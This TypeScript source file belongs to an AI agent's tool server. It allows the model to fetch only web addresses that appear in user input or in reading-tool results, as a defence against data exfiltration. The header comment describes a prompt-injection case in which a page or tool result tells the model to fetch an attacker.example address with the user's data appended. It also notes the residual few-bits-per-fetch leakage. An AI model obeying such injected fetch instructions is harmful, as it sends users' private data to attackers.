/**
 * Which addresses the model may have fetched.
 *
 * A web page, a file or a tool result can carry text written to steer the model ("fetch
 * https://attacker.example/c?d=" followed by what the user holds). A fetch is an outgoing request, so it
 * is a way for the user's data to leave. The agent therefore signs only the fetches of addresses it can
 * point to in what the model was GIVEN, and the tool refuses the rest (mcp-server/src/lib/url-check.ts).
 *
 * Given is what the user wrote (messages, the addresses of the request, the context they attached) and
 * what a tool that READS returned (a search, a page, a widget, a document). It is not what the model can
 * write itself: its own text and tool calls, and the results of the tools that compute or recall (the
 * code and SQL tools print any string they are told to, and recall_conversation and the bridge results
 * repeat what the model asked), so the model cannot put an address together there and then "find" it.
 *
 * The match is exact, so an address with the user's data added to a given one is not a given one.
 *
 * What stays: a page can list many addresses beforehand and the model can choose among them, which moves
 * a few bits per fetch, not the user's data.
 */

import type { Message, ToolMessage } from "../protocol/types";

/** The most addresses kept for a call: a page of links does not need more, and the set stays small. */
const MAX_KEYS = 20_000;
const MAX_TOKEN_CHARS = 2048;
const MAX_DEPTH = 8;
/** How much of one text is read: a page is read to its first few hundred KB, not to its last byte. */
const MAX_SCAN_CHARS = 2_000_000;
/** How much text is read for all of a request together: the newest is read first, and the rest as far as this goes. */
const MAX_TOTAL_SCAN_CHARS = 8_000_000;
// Real punctuation after an address is a character or two, not a run.
const MAX_STRIPS = 4;
// The most characters of candidates looked at in one text: a text made of nothing but the start of addresses
// is read to here, not to its end (a candidate is looked at to the end of its run, whatever its length).
const MAX_WORK = 4_000_000;

/** The tools whose results come from outside and that do not repeat what the model asked. */
const READING_TOOLS = ["web_search", "fetch_webpage", "inspect_webpage", "query_documents", "get_widget_data"] as const;
/** The same for the workspace's own functions (a widget's data is the user's own). */
const READING_FUNCTIONS = new Set(["get_widget_data"]);

const SCHEME_AT = /https?:\/\//gi;
const TOKEN_CHARS = new RegExp(`[^\\s<>"'\`]{1,${MAX_TOKEN_CHARS + 1}}`, "y");
const BARE_SPLIT = /[\s<>"'`()[\]{},;]+/;
const BARE_HOST = /^[a-z0-9-]+(?:\.[a-z0-9-]+)+(?::\d{1,5})?(?:[/?#].*)?$/i;
const TRAILING_PUNCTUATION = /[.,;:!?)\]}*_]$/;

/** What two spellings of one address have in common; null for anything that is not a web address. */
export function urlKey(raw: string): string | null {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return null;
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") return null;
  const host = url.host.toLowerCase().replace(/^www\./, "");
  const path = url.pathname.replace(/\/+$/, "");
  // The fragment never leaves the browser's side of a request, so it is not part of the address.
  return `${host}${path}${url.search}`;
}

function* variants(token: string): Generator<string> {
  let t = token;
  yield t;
  // `[text](https://a.example/x)` and "see https://a.example/x." carry the address plus what follows it.
  const close = t.search(/[)\]]/);
  if (close > 0) yield t.slice(0, close);
  for (let strips = 0; strips < MAX_STRIPS && t.length > 1 && TRAILING_PUNCTUATION.test(t); strips++) {
    t = t.slice(0, -1);
    yield t;
  }
}

/** How much more text may be read: shared by every text of one request. */
export interface ScanBudget {
  left: number;
}

/** The keys of the web addresses a text gives: written out, or as a bare `example.com/page`. */
export function addressesIn(whole: string, into: Set<string>, budget: ScanBudget = { left: Infinity }): void {
  if (budget.left <= 0) return;
  const cap = Math.min(MAX_SCAN_CHARS, budget.left);
  const text = whole.length > cap ? whole.slice(0, cap) : whole;
  budget.left -= text.length;
  const add = (candidate: string): void => {
    if (into.size >= MAX_KEYS) return;
    const key = urlKey(candidate);
    if (key) into.add(key);
  };

  let work = MAX_WORK;
  SCHEME_AT.lastIndex = 0;
  let found: RegExpExecArray | null;
  while (into.size < MAX_KEYS && (found = SCHEME_AT.exec(text)) !== null) {
    TOKEN_CHARS.lastIndex = found.index;
    const token = TOKEN_CHARS.exec(text)?.[0];
    work -= token?.length ?? 1;
    if (work < 0) break;
    if (!token || token.length > MAX_TOKEN_CHARS) continue;
    for (const v of variants(token)) add(v);
  }

  for (const piece of text.split(BARE_SPLIT)) {
    work -= piece.length + 1;
    if (into.size >= MAX_KEYS || work < 0) return;
    if (piece.length < 4 || piece.length > MAX_TOKEN_CHARS || piece.includes("://")) continue;
    for (const v of variants(piece)) {
      if (BARE_HOST.test(v)) add(`https://${v}`);
    }
  }
}

/** Every string in a value (a message's data, a context entry): the keys are not read, only what is said. */
function addressesInValue(value: unknown, into: Set<string>, budget: ScanBudget, depth = 0): void {
  if (into.size >= MAX_KEYS || budget.left <= 0 || depth > MAX_DEPTH || value == null) return;
  if (typeof value === "string") {
    addressesIn(value, into, budget);
  } else if (Array.isArray(value)) {
    for (const item of value) addressesInValue(item, into, budget, depth + 1);
  } else if (typeof value === "object") {
    for (const item of Object.values(value)) addressesInValue(item, into, budget, depth + 1);
  }
}

/** A tool by its canonical name, whichever the Workspace calls it by (it may put the server in front: `Ines Tools_fetch_webpage`). */
function isTool(name: unknown, canonical: string): boolean {
  return typeof name === "string" && (name === canonical || name.endsWith(`_${canonical}`));
}

export function isFetchTool(name: string): boolean {
  return isTool(name, "fetch_webpage");
}

function isReadingResult(message: ToolMessage): boolean {
  if (READING_FUNCTIONS.has(message.function)) return true;
  if (message.function !== "execute_agent_tool") return false;
  const tool = message.input_arguments?.tool_name;
  return READING_TOOLS.some((canonical) => isTool(tool, canonical));
}

/**
 * The addresses the model was given in this request: the user's messages, the addresses and context the
 * request carries, and the results of the tools that read from outside. `pages` are the texts of the pages
 * that the agent itself fetched at the user's request.
 */
export function addressesGiven(
  request: { messages: readonly Message[]; context?: unknown[]; urls?: string[] },
  pages: readonly string[] = [],
): Set<string> {
  const keys = new Set<string>();
  const budget: ScanBudget = { left: MAX_TOTAL_SCAN_CHARS };
  // What the user attached and what was fetched at their request first, then the conversation from the newest.
  for (const url of request.urls ?? []) addressesIn(url, keys, budget);
  addressesInValue(request.context, keys, budget);
  for (const page of pages) addressesIn(page, keys, budget);
  for (let i = request.messages.length - 1; i >= 0 && budget.left > 0; i--) {
    const message = request.messages[i];
    if (message.role === "human") addressesInValue((message as { content?: unknown }).content, keys, budget);
    else if (message.role === "tool" && isReadingResult(message)) addressesInValue(message.data, keys, budget);
  }
  return keys;
}

export function isGivenAddress(url: string, given: ReadonlySet<string>): boolean {
  const key = urlKey(url);
  return key !== null && given.has(key);
}

